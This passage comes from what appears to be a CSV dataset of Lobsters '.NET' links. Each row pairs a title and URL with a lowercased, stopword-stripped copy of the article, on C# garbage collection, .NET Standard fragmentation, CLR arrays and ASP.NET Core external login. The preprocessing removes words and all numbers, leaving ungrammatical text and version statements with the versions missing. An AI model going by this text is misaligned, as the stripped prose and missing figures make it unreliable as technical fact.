testnamespacetestclass maxmethod int int int bgts stmtexpr void il jmptrue void lclvar int int lclvar int importing testnamespacetestclass maxmethod int int int ret stmtexpr void il return int lclvar int importing testnamespacetestclass maxmethod int int int ret stmtexpr void il return int lclvar int finally turned following assembly code way efficient contains cmp jg couple mov instruction crucially done inline need call another method assembly listing method testnamespacetestclass maxmethod int int int emitting blendedcode cpu avx optimized code rsp based frame partially interruptible final local variable assignment int rcx int rdx outargs lclblk lcl frame size cmp ecx edx jg short mov eax edx ret mov eax ecx ret disclaimercredit got idea appendix excellent book shared source cli essential amazon also download copy edition want purchase print one appendix b author book reproduced work peter drayton add exponentiation opcode sscli inspired entire post thanks discus post hackernews rprogramming
407,Lobsters,dotnet,"C#, F#, .NET programming",Garbage collection in C#,https://chodounsky.net/2017/05/03/garbage-collection-in-c-sharp/,garbage collection c,garbage collection c garbage collector basic concept lisp john mccarthy mark sweep algorithm complex stop world incremental concurrent generational collection generational hypothesis generation generation generation characteristic modern garbage collector program throughput gc throughput heap overhead pause time pause frequency pause distribution allocation performance concurrency scaling warmup time configuration performance debug low latency mode managed unmanaged resource dispose pattern cleaning unmanaged resource language ruby incremental marking c smart pointer reference counting java tracing generational garbage collection python reference counting periodical cycle detection javascript garbage collection conclusion c digest resource c digest,garbage collection c may posted c fundamental garbage collection programming matter task hand manipulating data stored basic type object live inside computer memory eventually memory fill need make room new data discard old one either hand like c c programmer used use language mechanism c fortunate enough garbage collector take care memory basic concept short garbage collector try find object longer use program delete memory first garbage collected language lisp written john mccarthy one founder artificial intelligence around concept around garbage collector place making trade safe memory allocation programmer productivity performance overhead garbage collected language never suitable realtime critical application like air traffic control get solid performance seen successful high frequency trading platform written c garbage collection responsible cleaning memory compacting also allocating new object net clr making use tracing garbage collector mean every collection collector figure whether object used tracing every object stack root gc handle static data every object could traced marked live end tracing one without mark removed swept memory get compacted called simple mark sweep algorithm get bit complex enough simple mental model happening hood garbage collector halt program running call event stop world guarantee new object allocated collection also mean delay program minimise disruption incremental concurrent garbage collector designed incremental collection make pause shorter work small increment concurrent stop program paying overall longer collection time use cpu memory resource traditional stop world generational collection david ungar came generational hypothesis layed foundation gc use day young object die young therefore reclamation algorithm waste time old object copying survivor cheaper scanning corps hypothesis gave birth generational garbage collector first used smalltalk used modern platform today c exception memory divided several generation based age object collection happens youngest generation surviving object promoted generation c generation generation youngest generation shortlived object collection happens often new object placed exception large object go straight generation generation serf buffer shortlived longlived object generation place longlived object get collected le often collection generation call full garbage collection go object managed memory keep balance generation modern platform using hybrid approach generational cycle minor cycle variation full mark sweep major cycle clr automatically adjusts letting used memory get big letting garbage collection take much time setting threshold new object allocation collection get triggered memory low threshold exceeded gccollect called manually collection triggered every thread suspended allocate new memory gc thread go action already know collector us static data know whether object alive static field kept memory forever appdomain get unloaded might lead common memory leak refers collection keep adding object collection static field keep collection alive object inside alive well careful possibly avoid usage static field characteristic modern garbage collector different characteristic many thing programming different trade offs based application requirement could tuned towards le interruption better user experience maybe want run fast serverside application scale characterizes garbage collector program throughput cpu time spent collecting v cpu time useful work gc throughput amount data collector clear per cpu time heap overhead additional memory collector produced collection pause time time needed collection pause frequency often garbage collection happen pause distribution short pause v long pause consistent pause allocation performance much time new object allocation take predictable concurrency collector make use multicore cpu scaling gc handle larger heap warmup time collector adjust characteristic application long take adjust configuration influence type behavior application setting garbage collection different type two major type workstation server could configured setting gcserver enabled truefalse element application configuration configuration runtime gcserver enabled true runtime configuration workstation setting tuned clientside application low latency preferred want form wpf application become unresponsive long pause caused garbage collection mode favour user experience le cpu usage hand server configuration designed high throughput scalability serverside application us multiple dedicated thread garbage collection highest priority faster workstation also come cpu memory usage configuration assumes application running server prioritise gc thread accordingly also split managed heap section based number cpu one special gc thread per cpu take care collection section run mode computer multiple cpu default workstation gc mode active another option choose use concurrent collection using gcconcurrent enabled truefalse give responsive application le pause frequency time configuration runtime gcconcurrent enabled false runtime configuration concurrent mode extra background thread mark object alive application executing code come collection faster set dead object already built concurrency affect generation generation always nonconcurrent finish fast worth extra overhead concurrent option set dedicated thread used collection improve performance several process running side side try using workstation garbage collection concurrent collection disabled lead le context switching therefore better performance performance memory divided small object heap large object heap large object one byte go straight generation general fewer object managed heap le work garbage collector applied especially large object heap get collected le often feel like gc cause trouble various tool use debug memory performance counter windbg tracing etw event triggering collection manually gccollect usually counterproductive beneficial unless really know might help certain situation want release lot memory eg large dialog closed used unless diagnosed memory problem go calling gccollect manually frequently certainly see decrease performance application get situation latency application critical like middle high frequency trading decision loop set low latency mode put gc low intrusive mode become conservative gclatencymode oldmode gcsettingslatencymode systemruntimecompilerservicesruntimehelpersprepareconstrainedregions try gcsettingslatencymode gclatencymodelowlatency finally gcsettingslatencymode oldmode collection generation paused time low latency mode lead shorter le frequent pause time therefore decreased program latency come price might run memory careful best guideline keep low latency section short possible allocate many new object especially large heap case might want call gccollect appropriate force generation collection forget latency mode process wide running multiple thread applied managed unmanaged resource clr code written managed garbage collected c get compiled cil run top clr c code garbage collected sound easy enough need use unmanaged resource use almost daily basis database connection com interops network file stream many others unmanaged resource garbage collected need free memory hand write type us unamanged resource implement dispose pattern provide mechanism free resource case consumer forgets call dispose basic implementation dispose pattern use safehandle could look like public class disposableresourceholder idisposable private safehandle resource public disposableresourceholder thisresource public void dispose dispose true gcsuppressfinalize protected virtual void dispose bool disposing disposing resource null resourcedispose free resource use objectfinalize safehandles detail check cleaning unmanaged resource consumer type unmanaged resource always use using pattern using var new streamreader filetxt sclose tell object need disposed implement idisposable interface static analysis tool help notice case might forgotten dispose object language first version ruby used simple mark sweep technique best performer simple author cextensions write native extension simplicity key ruby growth beginning took day generational collection introduced ruby current version improve throughput program quite late term language maturity ruby introduced incremental marking address long pause time running gc short increment programmer c garbage collection need memory management hand technique make easier smart pointer part c standard tool automatically deletes memory heap smart pointer implemented reference counting ensures object deleted soon longer needed opposed tracing garbage collection unused object wait next cycle collection java similar c us tracing generational garbage collection heap structured young generation eden old generation permanent generation gc us minor major cycle clean generation promote object one collection young old generation stop world event thread suspended finish different type collector jvm serial parallel concurrent mark sweep replacement java python use tracing garbage collection reference counting periodical cycle detection solve case two dead object pointing opposed classic reference counting combine generational approach us reference count instead mark sweep algorithm deal memory fragmentation try avoid allocating object different pool memory javascript unified approach garbage collection hand browser vendor differently internet used reference counting garbage collector dom object almost modern browser shipped tracing mark sweep algorithm extra improvement generation incremental collection concurrency parallelism conclusion c language top clr garbage collected use generational garbage collection generation advanced tracing mark sweep algorithm figure object still alive change characteristic collector changing server workstation mode setting concurrency mode time triggering garbage collection manually good idea unless really know case latency important use latency mode increase program throughput eliminate pause lastly unmanaged resource like file stream network database connection need take special care time implementing using idisposable pattern cause memory leak application liked article might enjoy c digest newsletter link net community put together every week resource justin self nice post minor note large object byte get collected gen collection really part gen part large object heap would like get top link c every monday sign c digest stay date
408,Lobsters,dotnet,"C#, F#, .NET programming",How a Blind Developer uses Visual Studio,https://www.youtube.com/watch?v=iWXebEeGwn0,blind developer us visual studio,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature
409,Lobsters,dotnet,"C#, F#, .NET programming","System.Threading.Thread, Universal Windows Platform, and the fragmentation of .NET Standard",https://neosmart.net/blog/2017/system-threading-thread-universal-windows-platform-and-the-fragmentation-of-net-standard/,systemthreadingthread universal window platform fragmentation net standard,first open sourced net platform microsoft released net standard problem reason quite understand microsoft releasing package compatible net standard version x reality uwp discussed death github oddly outraged suggestion bugged nuget opensourced github,post chiefly directed net developer others involved various stage net deployment particular anyone keeping tab situation new crossplatform opensource net core initiative net standard came microsoft response increased fragmentation net platform result myriad different deployment target available kind stuff feel free skip post read try explain thing sufficiently go new microsoft satya nadella helm first open sourced net platform november became clear fully intended put everything initiative great thing big change coming net framework language also signaled inevitable beginning new level fragmentation framework thus far large resisted major fragmentation past year taking framework cobbled together part old new built atop gdi various windowsspecific anachronism meant porting net framework asis platform nighimpossible major change would made support gargantuan effort prior release net core crossplatform net framework net framework basically consisted number official release moreorless superset preceding version exception original net version support microsoft isvs version platform moreorless officially officially ongoing despite initial confusion result munging framework version runtime version net fragmentation minimal simply chose version framework target choosing lower version meant wider base support access fewer apis newfangled feature opting build newer version framework meant gaining access newer functionality awesomeness inability support older operating system could run certain release framework strict matter supported apis net framework circa looked like see neat venn diagram framework featuring apis previous version supported microsoft also great job supporting window xp firstclass net target way release net august making quite easy target net platform single binary using relativelyrecent version looked little closer reality picture like two different version common language runtime remember net despite never getting jvm bad reputation jit platform two different version clr could installed sidebyside technically version clr support running program compiled net framework version net net net allowing microsoft break abi compatibility make needed upgrade clr support feature net however apis backwards compatible enough one could force net binary compiled late run even net shown clr however introduction net core first version net released new crossplatform opensource initiative building application releasing library would support version net suddenly became lot trickier apis supported even version standard net framework supported net core systemwindowsforms ui namespace built directly atop gui binding understandably missing net core even wpfxamlbased nonplatformspecific managed ui net many core feature framework bcl base class library developer using decade also removed order support clean break osspecific underpinnings legacy net framework reuse microsoft illustration thing suddenly looked like sake discussion fine ignore column denoted xamarin added mix due microsoft buyout xamarin maker mono see along net core came another ui toolkit uwp universal window platform also supported nonmicrosoft platform uwp new ui toolkit day modern window platform based metra xaml available window window mobile xbox biggest problem image however enormous difference supported apis bcl core library microsoft split massive chunk bcl code separate smaller library maintaining absolute minimum shared code net ecosystem new net core library would available netsupporting platform ecosystem across version new framework year come make sense mess mitigate effect massive shakeup ensuing fragmentation two year announcement net core microsoft released net standard mosteffectively considered meta target used indicate subset net platform net framework v net core v xamarin would compatible resulting code remember net portable well lot like except pretending pcl exist sake sane discussion use another microsoft illustration show net standard fit mix take graphic literally said net standard actually library target list core apis guaranteed available across conforming net target support particular version unifying update net framework net core xamarin replaces bcl core library mono class library single library rather versioned spec defining minimum set apis guaranteed run mostlyidentical result three library incremental version three system library would implement common feature culminating subsequent release net standard allowing developer use greater number apis whilst still targeting three platform hopefully caught situation net framework net core net standard finally get actually wanted discus unfortunate beginning new fragmentation fragile new ecosystem net standard see chart circa march application compiled today net standard metatarget would run platform implementing net core net mono xamarinios xamarinandroid uwp likewise library compiled net standard metatarget used application library also targeting net standard higher microsoft intends deal net ecosystem fragmentation continuously updating net standard spec independently releasing version various net implementation various supported platform support standard hence net standard problem reason quite understand microsoft releasing package labelled compatible net standard version x reality supporting specific subset net platform implementing version net standard mentioned thanks bearing u btw net core introduced new core library supplanted bcl microsoft made available huge chunk bcl completely reimplemented crossplatform support package supported net core provide access bcl apis new core library package released nuget somehow managed avoid even mentioning discussion making easy mark dependency library libraryapplication make deployment net framework net core platform easier package compiled version net standard library supported making easy theory figure package use support certain target theory formula figuring apispackages use quite simple pick environment want libraryapplication run figure greatest common denominator supported net standard environment implement target make sure use package dependency include support version net standard theory look like want add dependency via nuget visual studio unfortunately currently zero indication actual nuget search result whether package supported project currentlytargeted version net click zoom see lowerhalf righthand pane list dependency selected package broken target basically read along line compiling version x net need dependency z version x net mean net framework net portable xamarin etc etc etc net standard vsomething shortcut indicate platform implementing version x net standard quite effective scalable except happens look package systemthreadingthread one moreimportant namespaces original bcl spun package stripped core library see list supported platform includes netstandard meaning used platform implementing version net standard spec referring net standard chart earlier post see includes net core net mono xamarin io xamarin android uwp platform likely noop systemthreadingthread core namespace already provided net mono xamarin iosandroid without need additional package however uwp net core namespace package supposed come however package support uwp trying install package project targeting uwp lead following error pm installpackage systemthreadingthread get http ok http restoring package c usersmahmoudgitwinmessagewinmessageuwpprojectjson installpackage one project incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage systemthreadingthread provides compiletime reference assembly systemthreadingthread uap runtime assembly compatible installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one project incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one package incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage systemthreadingthread provides compiletime reference assembly systemthreadingthread uap runtime assembly compatible installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one project incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one package incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage systemthreadingthread provides compiletime reference assembly systemthreadingthread uap runtime assembly compatible installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one project incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one package incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage systemthreadingthread provides compiletime reference assembly systemthreadingthread uap runtime assembly compatible installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one project incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one package incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage systemthreadingthread provides compiletime reference assembly systemthreadingthread uap runtime assembly compatible installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one project incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one package incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage systemthreadingthread provides compiletime reference assembly systemthreadingthread uap runtime assembly compatible installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one project incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage one package incompatible uap installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand installpackage package restore failed rolling back package change winmessageuwp installpackage systemthreadingthread categoryinfo notspecified installpackage exception fullyqualifiederrorid nugetcmdletunhandledexception nugetpackagemanagementpowershellcmdletsinstallpackagecommand microsoft systemthreadingthread package purport support net standard provides implementation compatible uwp target worse zero indication without package actually support net standard like claim meaning literally hundred thousand popular package listed nuget many also developed microsoft developed universal support net standard implementation yes including uwp never actually work uwp target use systemthreadingthread package provide thread support unknown issue oversight discussed death github due implemented net standard despite people actually oddly outraged suggestion nothing address fact microsoft knowingly publishing package claim support net standard fact bugged thousand package think used window mobile uwp application window store fact saddest part really easy microsoft provided package net core net standard nuspec edit away case would avoided currently stand one package insisting reintroducing fragmentation net ecosystem net standard damned complaining aside published mostly complete implementation systemthreadingthread built systemthreadingtasks namespace net standard yes including uwp nuget opensourced github also contributed fix number popular open source project available via nuget ostensibly supported net standard uwp fact due dependency systemthreadingthread believe post came place love desperate urge voice concern hope avoiding fragmentation fragile ecosystem
410,Lobsters,dotnet,"C#, F#, .NET programming",Arrays and the CLR - a Very Special Relationship,http://www.mattwarren.org/2017/05/08/Arrays-and-the-CLR-a-Very-Special-Relationship/,array clr special relationship,array clr special relationship exists string clr clr internals fundamental common language runtime clr ecma specification il intermediate language instruction memory type safety memory type safety indexing end array however prevent case indeed make impossible programmer create memoryunsafe program following memorysafe operator arrayfetch operator ldelem stelem ldelema array include tag specifying length verifiable code enforcing memory type safety array bound check array pointer new pointer value clr array liberal casting rule array must also size array must complete type information implementation detail comment marc gravell sum nicely special helper class net array ilist generic algorithm stl meant write code twice taking ilist taking needed thing strongly typed way ilist want support multidimensional array since ilist provides single dimensional access instead making systemarray implement ilist made implement ilist array source code getactualimplementationforarraygenericilistorireadonlylistmethod szarrayhelper szgenericarrayenumerator property top class removing bound check gist allocating array runtime treat array differently search isarray special relationship reading array source code reference,array clr special relationship may word ago wrote special relationship exists string clr well turn array clr even deeper one type closeness hold hand first meeting aside like reading clr internals may find post interesting fundamental common language runtime clr array fundamental part clr included ecma specification make clear runtime implement addition several il intermediate language instruction specifically deal array newarr etype create new array element type etype ldelemref load element index onto top stack type element type array pushed cil stack stelem typetok replace array element index value stack also stelemi etc ldlen push length type native unsigned int array stack make sense array building block many data type want available well defined efficient modern highlevel language like c without array list dictionary queue stack tree etc built ontop array provided lowlevel access contiguous piece memory typesafe way memory type safety memory typesafety important without net described managed runtime left deal type issue get writing code lowlevel language specifically clr provides following protection using array section memory type safety botr intro clr page gc necessary ensure memory safety sufficient gc prevent program indexing end array accessing field end object possible compute field address using base offset computation however prevent case indeed make impossible programmer create memoryunsafe program common intermediate language cil operator fetch set arbitrary memory thus violate memory safety also following memorysafe operator clr strongly encourages use programming fieldfetch operator ldfld stfld ldflda fetch read set take address field name arrayfetch operator ldelem stelem ldelema fetch set take address array element index array include tag specifying length facilitates automatic bound check access also section verifiable code enforcing memory type safety botr page practice number runtime check needed actually small include following operation casting pointer base type pointer derived type opposite direction checked statically array bound check saw memory safety assigning element array pointer new pointer value particular check required clr array liberal casting rule however get protection free cost pay note need check place requirement runtime particular memory gc heap must tagged type casting operator implemented type information must available runtime must rich enough determine cast valid eg runtime need know inheritance hierarchy fact first field every object gc heap point runtime data structure represents type array must also size bound checking array must complete type information element type implementation detail turn large part internal implementation array best described magic stack overflow comment marc gravell sum nicely array basically voodoo predate generic yet must allow onthefly typecreation even net implemented using trick hack sleight hand yep right array parametrised ie generic generic even existed mean could create array int string long able write list int list string became possible net special helper class magic sleight hand made possible thing clr breaking usual typesafety rule special array helper class called szarrayhelper first trick needed net array ilist generic algorithm stl designing generic collection class one thing bothered write generic algorithm would work array collection drive generic programming course must make array generic collection seamless possible felt simple solution problem meant write code twice taking ilist taking solution dawned array needed implement generic ilist made array implement nongeneric ilist rather simple due lack strong typing ilist base class array systemarray needed thing strongly typed way ilist done common case ie single dimensional array restriction though want support multidimensional array since ilist provides single dimensional access also array nonzero lower bound rather strange probably mesh well ilist people may iterate return count property ilist instead making systemarray implement ilist made implement ilist mean single dimensional array lower bound often called szarray internally think brad wanted promote term vector publically one point time element type implement ilist string implement ilist string also comment array source code shed light reason call ilist array meth actually implemented szarrayhelpermeth workaround exists two reason working set reason nt want insert method array hierachy normal way platform devtime reason still want use c compiler generate method body though questionable whether devtime saved done convenience efficiently want every instance systemarray carry around code ienumerable ilist implementation mapping take place via call getactualimplementationforarraygenericilistorireadonlylistmethod win prize best method name coreclr source responsible wiring corresponding method szarrayhelper class ie ilist count szarrayhelpercount method part ienumerator interface szgenericarrayenumerator used potential cause security hole break normal c type system guarantee specifically regarding pointer illustrate problem source code count property note call jithelpersunsafecast internal int getcount warning array szarrayhelper see comment may introduce security hole jithelpersunsafecast return thislength yikes remap able call length correct object case comment enough strongly worded comment top class spell risk generally magic hidden occasionally leak instance run code szarrayhelper show stacktrace targetsite property notsupportedexception try int someints ilist int collection someints throw notsupportedexception collection readonly collectionclear catch notsupportedexception nsex consolewriteline nsextargetsitedeclaringtype nsextargetsite consolewriteline nsexstacktrace removing bound check runtime also provides support array conventional way first related performance array bound check well good providing memorysafety cost possible jit remove check know redundant calculating range value loop access compare actual length array determines never attempt access item outside permissible bound array runtime check removed information link take area jit source code deal really keen take look gist put together explore scenario bound check removed removed allocating array another task runtime help allocating array using handwritten assembly code method optimised possible see runtime treat array differently finally array intertwined clr lot place dealt specialcase instance search isarray coreclr source return hit including method table array built differently call tostring array get special formatting ie myclass yes fair say array clr special relationship reading always link enjoyment array source code reference
411,Lobsters,dotnet,"C#, F#, .NET programming",External Login Providers in ASP.NET Core,http://www.blinkingcaret.com/2017/05/03/external-login-providers-in-asp-net-core/,external login provider aspnet core,middleware pipeline pipeline composed middleware component authentication middleware authenticationmiddleware authenticationhandler make user logged active passive challenge interacting authentication middleware middleware interaction example using cookie middleware sign user redirect loop using external login provider middleware http wwwyourdomaincomsigningoole http wwwyourdomaincomsigningoogle promptnone brief overview digitial ocean article oauth aspnet identity,able user authenticate using google facebook twitter etc great way remove annoyance create local account go email validation process usually refer service delegate task authenticating user external login provider popular protocol openid connect documentation using external login provider aspnet scarce make matter worse template get file new project easy follow without knowledge authentication middleware aspnet work nearly impossible comprehend really understand use external login provider aspnet necessary understand middleware pipeline particular authentication middleware work also little bit oauth protocol blog post explains piece fit together provides example leverage authentication middleware external login provider aspnet core identity middleware pipeline aspnet core application receives request go pipeline composed middleware component middleware opportunity inspect request something pas along rest pipeline something extra rest pipeline executed pipeline defined startup class specifically configure method example middleware added pipeline public void configure iapplicationbuilder app ihostingenvironment env iloggerfactory loggerfactory appuse async httpcontext context func task next work invoking rest pipeline await nextinvoke let rest pipeline run work rest pipeline run one important thing aware middleware access instance httpcontext instance send message example middleware end pipeline change httpcontext something like httpcontextitems loginprovider google middleware precedes able access value another important thing mind middleware stop pipeline ie choose invoke next middleware particularly important external login provider example use google external login provider user redirected http yourappdomaincomsigningoogle successful authentication tried default visual studio template external login provider case google might noticed controller action seemingly anything else responds url happens googleauthentication middleware look url find take request invoking middleware pipeline namely mvc middleware consequence type behavior order middlewares run important imagine scenario support multiple external login provider eg facebook google run need middleware namely cookieauthentication middleware able transform information put httpcontext cookie represents signed user example given later article authentication middleware make middleware authentication middleware inherits class named authenticationmiddleware class little create authenticationhandler authenticationhandler functionality even though going describe create authentication middleware going describe authentication middlewares interacted also interact several pipeline adding authenticationmiddleware minimum specify authenticationscheme flag named automaticauthenticate another named automaticchallenge think authenticationscheme name authentication middleware previous version aspnet called authentication type automaticauthenticate flag specifies middleware authenticate user soon reach turn pipeline example cookie middleware added pipeline automaticauthenticate true look authentication cookie request use create claimsprincipal add httpcontext way make user logged would setup cookie middleware automaticauthenticate false cookie request cookie middleware user would automatically logged previous version aspnet authentication middleware automaticauthenticate true called active authentication middleware automaticauthenticate false called passive authentication middleware challenge challenge authentication middleware new term exist prior aspnet core know reasoning behind calling challenge try describe called way instead give example happens middleware challenged example cookie middleware challenged redirect user login page google authentication middleware return response redirects user google oauth sign page usually challenge authentication middleware need name authenticationscheme example challenge authentication middleware authenticationscheme google could controller action public iactionresult doachallenge return challenge google however issue naked challenge ie naming authentication middleware eg return challenge authentication middleware automaticchallenge true one respond challenge interacting authentication middleware challenge one action performed authentication middleware others authenticate signin signout example issue authenticate action authentication middleware imagine example controller action var claimsprincipal await contextauthenticationauthenticateasync applicationcookie cause middleware try authenticate return claimsprincipal example cookie middleware look request cookie build claimsprincipal claimsidentity information contained cookie usually issue manual authenticate authentication middleware configured automaticauthenticate false also possible issue signin await contextauthenticationsigninasync applicationcookie claimsprincipal applicationcookie cookie middleware would modify response cookie would created client cookie would contain information required recreate claimsprincipal passed parameter finally signout example cookie middleware would remove cookie identifies user example call sign authentication middleware named applicationcookie await contextauthenticationsignoutasync applicationcookie middleware interaction example hard imagine fit together without example simple example using cookie authentication middleware using cookie middleware sign user setup cookie authentication mvc middlewares public void configure iapplicationbuilder app ihostingenvironment env iloggerfactory loggerfactory appusecookieauthentication new cookieauthenticationoptions authenticationscheme mycookie automaticauthenticate true automaticchallenge true loginpath new pathstring accountlogin appusemvcwithdefaultroute happens request hit aspnet core application configured pipeline cookie authentication middleware inspect request looking cookie authentication middleware configured automaticauthenticate true cookie request decrypted converted claimsprincipal set httpcontextuser cookie middleware invoke next middleware pipeline case mvc cookie request cookie middleware invoke mvc middleware user performs request controller action annotated authorize attribute user signed ie httpcontextuser set example authorize public iactionresult actionthatrequiresanauthenticateduser challenge issued since cookie authentication middleware configured automaticchallenge true handle cookie middleware responds challenge redirecting user loginpath creating response status code location header accountlogin alternatively authentication middleware set automaticchallenge true want challenge specify authenticationscheme authorize activeauthenticationschemes mycookie public iactionresult actionthatrequiresanauthenticateduser cover possible way issue challenge also using challenge method controller public iactionresult triggerchallenge return challenge mycookie one important thing aware manually issuing challenge way issue challenge authentication middleware eg mycookie authentication middleware signed user case cookie request middleware middleware respond challenge unauthorized access redirect user accountaccessdenied change path setting accessdeniedpath cookieauthenticationoptions reasoning behind user already signed challenge issued middleware signed user must mean user sufficient permission eg required role behavior previous version aspnet redirect user back login page however caused problem external login provider used external login provider remembers already signed already signed example facebook use web app allows sign facebook redirected facebook immediately back web app assuming already authorized web app facebook enough permission cause redirect loop instead causing redirect loop case authentication middleware aspnet core redirect user access denied page using external login provider middleware simplest setup relying external login provider configure cookie authentication middleware responsible signing user middleware particular external login provider want use wanted use google could configure pipeline like public void configure iapplicationbuilder app ihostingenvironment env iloggerfactory loggerfactory appusecookieauthentication new cookieauthenticationoptions authenticationscheme maincookie automaticauthenticate true automaticchallenge false appusegoogleauthentication new googleoptions authenticationscheme google clientid yourclientid clientsecret yourclientsecret callbackpath new pathstring signingoogle signinscheme maincookie appusemvcwithdefaultroute whenever request come configuration go cookie middleware inspect looking cookie determines cookie belongs particular middleware name default prefix authenticationscheme aspnetcore maincookie name cookie would aspnetcoremaincookie would look chrome dev tool cookie request cookie authentication middleware simply invokes next middleware pipeline case google authentication middleware named google authentication middleware example google use external login provider provider must know web app always step register app given id secret go detail needed later clientid clientsecret property example next defined callbackpath user successfully logins using external login provider external login provider issue redirect user sent back web application originated login process callbackpath must match location external login provider redirects user become clear later finally signinscheme specifies authentication scheme google authentication middleware issue signin successful authentication situation external login provider middleware intervene challenged request match callbackpath let look challenge first imagine controller action like one public iactionresult signinwithgoogle var authenticationproperties new authenticationproperties redirecturi urlaction index home return challenge authenticationproperties google issue challenge specify instance authenticationproperties authenticationproperties class allows specify among option user redirect event successful authentication challenge issued googleauthentication middleware respond changing response status code redirect google login url look something like http responsetypecode clientidyourclientid redirecturihttp wwwyourdomaincom scopeopenid state user loginauthorize web application redirected back web application example define redirect uri http wwwyourdomaincomsigningoole registered web app google successful authentication google user redirected request come configuration correct match callbackpath signingoogle googleauthentication middleware take request one request look like http wwwyourdomaincomsigningoogle promptnone code value query string used make request google get information user part protocol explained detail next section note request sent web application google transparent user response request one us code googleauthentication middleware creates claimsprincipal sign signinscheme provided configuring middleware finally response changed redirect redirect url specified authenticationproperties challenge example index aciton home controller ever tried use default visual studio template external login provider probably noticed authenticate using external login provider taken page asked create local user account user go intermediate step effectively logged achieved using two cookie authentication middlewares one actively look cookie request sign user present automaticauthenticatetrue one frequently called applicationcookie example maincookie another one passive automaticauthenticatefalse ie automatically set httpcontextuser claimsidentity user respective cookie one frequently called externalcookie one extrenal login provider issue sign external login provider signinscheme set external cookie middleware one configured automaticauthenticatefalse challenge issued redirecturi set controller action manually invokes authentication signinscheme example startupcs configuration setup would look like public void configure iapplicationbuilder app ihostingenvironment env iloggerfactory loggerfactory appusecookieauthentication new cookieauthenticationoptions authenticationscheme maincookie automaticauthenticate true automaticchallenge false appusecookieauthentication new cookieauthenticationoptions authenticationscheme externalcookie automaticauthenticate false automaticchallenge false appusegoogleauthentication new googleoptions authenticationscheme google signinscheme externalcookie callbackpath new pathstring signingoogle clientid yourclientid clientsecret yourclientsecret appusemvcwithdefaultroute difference previous scenario additional authentication middleware externalcookie signinscheme external login provider set middleware challenge scenario redirect user controller action manually trigger authenticate externalcookie would look public iactionresult google var authenticationproperties new authenticationproperties redirecturi urlaction handleexternallogin account return challenge authenticationproperties google handleexternallogin method account controller public async task iactionresult handleexternallogin var claimsprincipal await httpcontextauthenticationauthenticateasync externalcookie something claimsprincipal possibly create new one additional information create local user etc await httpcontextauthenticationsigninasync maincookie claimsprincipal await httpcontextauthenticationsignoutasync externalcookie return redirect controller action manually triggering authenticate action externalcookie middleware going return claimsprincipal reconstructed cookie request cookie set googleauthentication middleware successful authentication set signinschemeexternalcookie internally googleauthentication middleware perform action similar httpcontextauthenticationsigninasync externalcookie claimsprincipalwithinformationfromgoogle cause externalcookie middleware create cookie next extra operation using information contained claimsprincipal example check user email contained claimsprincipalclaims already local account redirect user page option create local account presented default visual studio template example simply issue signin action maincookie middleware cause cookie middleware change response sent user cookie created encodes claimsprincipal ie response setcookie header cookie named aspnetcoremaincookie encoded claimsprincipal remember middleware one automaticauthenticatetrue mean every request inspect looking cookie named aspnetcoremaincookie present decoded claimsprincipal set httpcontextuser effectively making user signed finally issue signout externalcookie middleware cause middleware remove corresponding cookie recap happens point view user user go action issue challenge google middleware eg accountsigninwithgoogle challenge action defines redirecturl example accounthandleexternallogin response redirect google oauth login page successfully authenticating authorizing web application google redirect user back web application eg signingoogle google authentication middleware take request callbackpath match signingoogle use onetimeuse code get information user finally issue signin externalcookie issue redirect 